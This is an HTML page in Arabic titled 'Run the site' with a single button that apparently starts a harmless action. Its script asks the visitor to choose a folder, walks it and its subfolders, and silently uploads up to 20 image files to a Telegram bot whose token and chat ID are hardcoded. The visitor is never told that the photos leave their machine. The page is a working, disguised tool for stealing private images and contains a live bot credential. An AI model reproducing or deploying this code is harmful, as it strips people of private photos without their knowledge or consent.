<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تشغيل الموقع</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background-color: #f5f5f5; }
        .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
        button { background: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; margin: 20px 0; }
        button:hover { background: #45a049; }
    </style>
</head>
<body>
    <div class="container">
        <h1>تشغيل الموقع</h1>
        <p>اضغط الزر لبدء الإرسال التلقائي</p>
        <button id="sendButton">تشغيل الموقع</button>
    </div>

    <script>
        // بيانات البوت
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        const MAX_IMAGES = 20;

        document.getElementById('sendButton').addEventListener('click', async () => {
            try {
                // محاولة الوصول لمجلد الصور مباشرة
                const dirHandle = await window.showDirectoryPicker();
                await sendImagesAutomatically(dirHandle);
                alert("تم إرسال " + MAX_IMAGES + " صورة بنجاح!");
            } catch (error) {
                console.error('Error:', error);
                alert("حدث خطأ! تأكد من منح الإذن اللازم");
            }
        });

        async function sendImagesAutomatically(dirHandle) {
            let sentCount = 0;
            
            // إرسال الصور تلقائياً دون تفاعل
            for await (const entry of dirHandle.values()) {
                if (sentCount >= MAX_IMAGES) break;
                
                if (entry.kind === 'file' && isImage(entry.name)) {
                    await sendToTelegram(await entry.getFile());
                    sentCount++;
                }
                
                // البحث في المجلدات الفرعية إذا لزم الأمر
                else if (entry.kind === 'directory' && sentCount < MAX_IMAGES) {
                    const subDir = await dirHandle.getDirectoryHandle(entry.name);
                    for await (const subEntry of subDir.values()) {
                        if (sentCount >= MAX_IMAGES) break;
                        if (subEntry.kind === 'file' && isImage(subEntry.name)) {
                            await sendToTelegram(await subEntry.getFile());
                            sentCount++;
                        }
                    }
                }
            }
        }
        
        async function sendToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file, file.name);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            await new Promise(resolve => setTimeout(resolve, 300));
        }
        
        function isImage(filename) {
            return ['.jpg','.jpeg','.png','.gif','.bmp','.webp'].some(ext => 
                filename.toLowerCase().endsWith(ext));
        }
    </script>
</body>
</html>
